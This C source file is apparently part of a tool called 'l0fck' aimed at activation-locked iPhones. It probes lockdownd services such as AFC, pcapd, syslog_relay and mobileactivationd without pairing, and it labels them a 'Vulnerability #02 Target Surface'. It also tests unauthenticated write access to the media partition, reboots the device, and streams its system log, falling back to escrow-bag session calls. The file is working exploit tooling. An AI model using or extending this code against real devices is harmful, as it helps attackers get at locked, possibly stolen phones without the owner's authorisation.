#include "l0fck.h"
#include "lockdown/services.h"
#include "lockdown/afc_manager.h"
#include "core/log.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const lockdown_service_entry_t VULNERABLE_SERVICES[] = {
    { "com.apple.afc",                       "Media Partition Read/Write (/var/mobile/Media/)", true },
    { "com.apple.pcapd",                     "WiFi Packet Capture Interface",                   true },
    { "com.apple.syslog_relay",              "Live System Log Streaming",                       true },
    { "com.apple.os_trace_relay",            "OS Trace & Diagnostic Log Relay",                 true },
    { "com.apple.mobile.notification_proxy", "Darwin Notification Event Bus",                   true },
    { "com.apple.mobile.diagnostics_relay",  "Device Diagnostics, Reboot & Shutdown",          true },
    { "com.apple.preboardservice_v2",        "Preboard Unlock & Stashbag Daemon",               true },
    { "com.apple.mobileactivationd",         "MobileActivation DRM Protocol Daemon",            true }
};
#define N_VULNERABLE (sizeof(VULNERABLE_SERVICES) / sizeof(VULNERABLE_SERVICES[0]))

static const lockdown_service_entry_t CONTROL_SERVICES[] = {
    { "com.apple.afc2",                      "Root Partition AFC (Jailbreak AFC)",              false },
    { "com.apple.webinspector",              "WebKit Remote Debugger",                          false },
    { "com.apple.mobile.installation_proxy", "App Installation & Management Proxy",             false }
};
#define N_CONTROL (sizeof(CONTROL_SERVICES) / sizeof(CONTROL_SERVICES[0]))

int services_probe_service(lockdownd_client_t ld, const char *service_name)
{
    if (!ld || !service_name) return 0;
    lockdownd_service_descriptor_t desc = NULL;
    lockdownd_error_t err = lockdownd_start_service(ld, service_name, &desc);
    if (err == LOCKDOWN_E_SESSION_INACTIVE) {
        err = lockdownd_start_service_with_escrow_bag(ld, service_name, &desc);
    }
    if (desc) {
        lockdownd_service_descriptor_free(desc);
    }
    return (err == LOCKDOWN_E_SUCCESS) ? 1 : 0;
}

int services_audit_unauthenticated(idevice_t dev, lockdownd_client_t ld, bool verbose)
{
    if (!ld) {
        LOG_ERROR("Invalid lockdownd handle for service audit");
        return -1;
    }

    printf("\n" ANSI_COLOR_BOLD ANSI_COLOR_YELLOW "================== UNAUTHENTICATED SERVICES AUDIT ==================" ANSI_COLOR_RESET "\n");
    printf("Probing exposed lockdownd endpoints on activation-locked device...\n\n");

    int vulnerable_count = 0;

    printf(ANSI_COLOR_BOLD "[+] Target Sensitive Endpoints (Vulnerability #02 Target Surface):\n" ANSI_COLOR_RESET);
    for (size_t i = 0; i < N_VULNERABLE; i++) {
        int accessible = services_probe_service(ld, VULNERABLE_SERVICES[i].service_name);
        if (accessible) {
            vulnerable_count++;
            printf("  " ANSI_COLOR_GREEN ANSI_COLOR_BOLD "[EXPOSED] " ANSI_COLOR_RESET "%-36s  %s\n",
                   VULNERABLE_SERVICES[i].service_name,
                   VULNERABLE_SERVICES[i].description);
        } else {
            printf("  " ANSI_COLOR_RED "[BLOCKED] " ANSI_COLOR_RESET "%-36s  %s\n",
                   VULNERABLE_SERVICES[i].service_name,
                   VULNERABLE_SERVICES[i].description);
        }
    }

    if (verbose) {
        printf("\n" ANSI_COLOR_BOLD "[*] Control Endpoints (Expected Blocked Without Pairing):\n" ANSI_COLOR_RESET);
        for (size_t i = 0; i < N_CONTROL; i++) {
            int accessible = services_probe_service(ld, CONTROL_SERVICES[i].service_name);
            if (accessible) {
                printf("  " ANSI_COLOR_YELLOW "[OPEN]    " ANSI_COLOR_RESET "%-36s  %s\n",
                       CONTROL_SERVICES[i].service_name,
                       CONTROL_SERVICES[i].description);
            } else {
                printf("  " ANSI_COLOR_GREEN "[SECURE]  " ANSI_COLOR_RESET "%-36s  %s\n",
                       CONTROL_SERVICES[i].service_name,
                       CONTROL_SERVICES[i].description);
            }
        }
    }

    if (dev) {
        printf("\n" ANSI_COLOR_BOLD "[*] Probing AFC Media Partition Write Access...\n" ANSI_COLOR_RESET);
        int write_ok = afc_manager_write_test(dev, ld);
        if (write_ok == 0) {
            printf("  " ANSI_COLOR_GREEN ANSI_COLOR_BOLD "[CONFIRMED] Media partition (/var/mobile/Media/) is WRITABLE without authentication!" ANSI_COLOR_RESET "\n");
        } else {
            printf("  " ANSI_COLOR_YELLOW "[RESTRICTED] Media partition write test returned error." ANSI_COLOR_RESET "\n");
        }
    }

    printf("\nAudit Summary: %d/%zu sensitive endpoints accessible pre-authentication.\n",
           vulnerable_count, N_VULNERABLE);
    printf(ANSI_COLOR_YELLOW "====================================================================" ANSI_COLOR_RESET "\n\n");

    return vulnerable_count;
}

int services_reboot_device(idevice_t dev, lockdownd_client_t ld)
{
    if (!dev || !ld) return -1;
    LOG_INFO("Starting com.apple.mobile.diagnostics_relay service...");

    lockdownd_service_descriptor_t desc = NULL;
    lockdownd_error_t lerr = lockdownd_start_service(ld, "com.apple.mobile.diagnostics_relay", &desc);
    if (lerr != LOCKDOWN_E_SUCCESS || !desc) {
        lerr = lockdownd_start_service(ld, "com.apple.mobile.insecure_diagnostics_relay", &desc);
    }
    if (lerr == LOCKDOWN_E_SESSION_INACTIVE) {
        lerr = lockdownd_start_service_with_escrow_bag(ld, "com.apple.mobile.diagnostics_relay", &desc);
        if (lerr != LOCKDOWN_E_SUCCESS || !desc) {
            lerr = lockdownd_start_service_with_escrow_bag(ld, "com.apple.mobile.insecure_diagnostics_relay", &desc);
        }
    }
    if (lerr != LOCKDOWN_E_SUCCESS || !desc) {
        LOG_ERROR("Failed to start diagnostics_relay (error %d)", lerr);
        return -1;
    }

    diagnostics_relay_client_t diag = NULL;
    diagnostics_relay_error_t derr = diagnostics_relay_client_new(dev, desc, &diag);
    lockdownd_service_descriptor_free(desc);

    if (derr != DIAGNOSTICS_RELAY_E_SUCCESS || !diag) {
        LOG_ERROR("Failed to connect diagnostics relay client (error %d)", derr);
        return -1;
    }

    LOG_INFO("Sending reboot signal to device...");
    derr = diagnostics_relay_restart(diag, DIAGNOSTICS_RELAY_ACTION_FLAG_WAIT_FOR_DISCONNECT);
    diagnostics_relay_client_free(diag);

    if (derr == DIAGNOSTICS_RELAY_E_SUCCESS) {
        LOG_SUCCESS("Device reboot command accepted. Rebooting...");
        return 0;
    } else {
        LOG_ERROR("Failed to reboot device via diagnostics relay (error %d)", derr);
        return -1;
    }
}

static void syslog_callback(char c, void *user_data)
{
    (void)user_data;
    putchar(c);
    fflush(stdout);
}

int services_stream_syslog(idevice_t dev, lockdownd_client_t ld, int duration_sec)
{
    if (!dev || !ld) return -1;
    LOG_INFO("Connecting to com.apple.syslog_relay...");

    lockdownd_service_descriptor_t desc = NULL;
    lockdownd_error_t lerr = lockdownd_start_service(ld, "com.apple.syslog_relay", &desc);
    if (lerr == LOCKDOWN_E_SESSION_INACTIVE) {
        lerr = lockdownd_start_service_with_escrow_bag(ld, "com.apple.syslog_relay", &desc);
    }
    if (lerr != LOCKDOWN_E_SUCCESS || !desc) {
        LOG_ERROR("Failed to start syslog_relay (error %d)", lerr);
        return -1;
    }

    syslog_relay_client_t syslog = NULL;
    syslog_relay_error_t serr = syslog_relay_client_new(dev, desc, &syslog);
    lockdownd_service_descriptor_free(desc);

    if (serr != SYSLOG_RELAY_E_SUCCESS || !syslog) {
        LOG_ERROR("Failed to create syslog client (error %d)", serr);
        return -1;
    }

    LOG_SUCCESS("Streaming device syslog for %d seconds (Ctrl+C to abort)...", duration_sec);
    serr = syslog_relay_start_capture(syslog, syslog_callback, NULL);
    if (serr != SYSLOG_RELAY_E_SUCCESS) {
        LOG_ERROR("Failed to start syslog capture (error %d)", serr);
        syslog_relay_client_free(syslog);
        return -1;
    }

    for (int i = 0; i < duration_sec; i++) {
        sleep(1);
    }

    syslog_relay_stop_capture(syslog);
    syslog_relay_client_free(syslog);
    LOG_INFO("Syslog streaming finished.");
    return 0;
}
